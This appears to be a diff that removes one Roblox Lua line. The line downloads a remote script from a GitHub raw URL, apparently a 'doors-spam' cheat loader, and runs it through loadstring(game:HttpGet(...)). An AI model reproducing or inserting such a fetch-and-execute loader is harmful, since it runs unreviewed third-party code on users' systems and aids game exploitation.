@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/doors-spam3-9gcvzonnmjn6ld.lua"))()
